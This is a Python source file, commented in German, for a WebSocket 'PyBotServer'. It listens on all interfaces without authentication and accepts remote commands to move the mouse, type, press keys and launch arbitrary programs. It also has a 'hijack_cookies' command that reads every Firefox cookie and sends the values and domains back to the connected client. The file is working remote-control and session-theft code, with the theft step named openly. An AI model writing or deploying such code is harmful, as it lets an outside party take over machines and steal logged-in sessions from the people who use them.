#import pyautogui
import asyncio
import websockets
import json
import subprocess
import logging
import browser_cookie3

logging.basicConfig(level=logging.INFO)

class PyBotServer:
    def __init__(self, host="0.0.0.0", port=8765):
        self.host = host
        self.port = port
        self.__websocket = None  # Wird später beim Verbindungsaufbau gesetzt
        self.command_map = {
            'move_mouse': self.move_mouse,
            'ping': self.ping,
            'click': self.click,
            'type_text': self.type_text,
            'run_program': self.run_program,
            'press': self.press_key,
            'hotkey': self.hotkey_action,
            'hijack_cookies': self.hijack_cookies
        }
        logging.info(f"WebSocket Server initialized on {self.host}:{self.port}")

    async def send_response(self, status, message):
        """Hilfsmethode zum Senden von JSON-Antworten."""
        if self.__websocket:
            response = {"status": status, "message": message}
            await self.__websocket.send(json.dumps(response))
            logging.info(f"Sent response: {response}")

    async def hijack_cookies(self, data):
        try:
            cookies = browser_cookie3.firefox()
            cookie_dict = {cookie.name: {'value': cookie.value, 'domain': cookie.domain} for cookie in cookies}
            await self.send_response("succsess", json.dumps(cookie_dict))
        except Exception as e:
            await self.send_response("error", f"Failed to hijack cookies. Error: {str(e)}")


    async def move_mouse(self, data):
        x = data.get('x')
        y = data.get('y')
        click = data.get('click', False)  # 'click' Parameter, standardmäßig False
        button = data.get('button', 'left')  # Optionale Maustaste, standardmäßig 'left'
        button_mapping = {
            'left': '1',
            'middle': '2',
            'right': '3'
        }

        if x is not None and y is not None:
            # Nutze xdotool zum Bewegen der Maus
            subprocess.run(['xdotool', 'mousemove', str(x), str(y)])
            logging.info(f"Mouse moved to {x}, {y}")

            # Führe optional einen Klick aus
            if click:
                button_code = button_mapping.get(button, '1')  # Standardmäßig linke Maustaste
                subprocess.run(['xdotool', 'click', button_code])
                logging.info(f"Clicked {button} mouse button at {x}, {y}")
                await self.send_response("success", f"Moved mouse to {x}, {y} and clicked {button} mouse button")
            else:
                await self.send_response("success", f"Moved mouse to {x}, {y}")
        else:
            await self.send_response("error", "Invalid coordinates")
            logging.warning("Invalid coordinates provided for move_mouse")

    async def ping(self, data):
        await self.send_response("success", "PONG!")
        logging.info("Ping received, responded with PONG")

    async def click(self, data):
        button = data.get('button', 'left')
        button_mapping = {
            'left': '1',
            'middle': '2',
            'right': '3'
        }
        # Nutze xdotool zum Klicken
        button_code = button_mapping.get(button, '1')  # Standardmäßig linke Maustaste
        subprocess.run(['xdotool', 'click', button_code])
        await self.send_response("success", f"Clicked {button} mouse button")
        logging.info(f"Clicked {button} mouse button")

    async def type_text(self, data):
        text = data.get('text')
        if text:
            process = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE)
            process.communicate(input=text.encode())
            subprocess.run(['xdotool', 'key', 'ctrl+v'])
            await self.send_response("success", f"Typed '{text}'")
            logging.info(f"Typed text: {text}")
        else:
            await self.send_response("error", "No text provided")
            logging.warning("No text provided for type_text")

    async def run_program(self, data):
        program = data.get('program')
        params = data.get('params', [])
        if program:
            try:
                subprocess.Popen([program] + params)
                await self.send_response("success", f"Started program: {program} with params: {params}")
                logging.info(f"Started program: {program} with params: {params}")
            except subprocess.CalledProcessError as e:
                await self.send_response("error", f"Failed to start program: {program}. Error: {str(e)}")
                logging.error(f"Failed to start program: {program}. Error: {str(e)}")
        else:
            await self.send_response("error", "No program provided")
            logging.warning("No program provided for run_program")

    async def press_key(self, data):
        key = data.get('key')
        if key:
            # Nutze xdotool zum Drücken einer Taste
            subprocess.run(['xdotool', 'key', key])
            await self.send_response("success", f"Pressed '{key}'")
            logging.info(f"Pressed key: {key}")
        else:
            await self.send_response("error", "No key provided")
            logging.warning("No key provided for press_key")

    async def hotkey_action(self, data):
        action = data.get('action')
        if action:
            if action == 'save':
                subprocess.run(['xdotool', 'key', 'ctrl+s'])
            await self.send_response("success", f"Performed hotkey '{action}'")
            logging.info(f"Performed hotkey: {action}")
        else:
            await self.send_response("error", "No action provided")
            logging.warning("No action provided for hotkey_action")

    async def unknown_command(self, data):
        await self.send_response("error", "Unknown command")
        logging.warning(f"Unknown command received: {data.get('command')}")

    async def handler(self, websocket, path):
        """Handler-Methode für eingehende WebSocket-Verbindungen."""
        self.__websocket = websocket  # Speichere die WebSocket-Verbindung als Instanzvariable
        logging.info("New WebSocket connection established")
        async for message in websocket:
            try:
                data = json.loads(message)
                command = data.get('command')
                # Funktion aus der Mapping-Tabelle holen oder unknown_command verwenden
                action = self.command_map.get(command, self.unknown_command)
                logging.info(f"Received command: {command}")
                await action(data)
            except Exception as e:
                await self.send_response("error", str(e))
                logging.error(f"Error processing message: {str(e)}", exc_info=True)

    async def start_server(self):
        """Startet den WebSocket-Server."""
        async with websockets.serve(self.handler, self.host, self.port):
            await asyncio.Future()  # Server läuft endlos
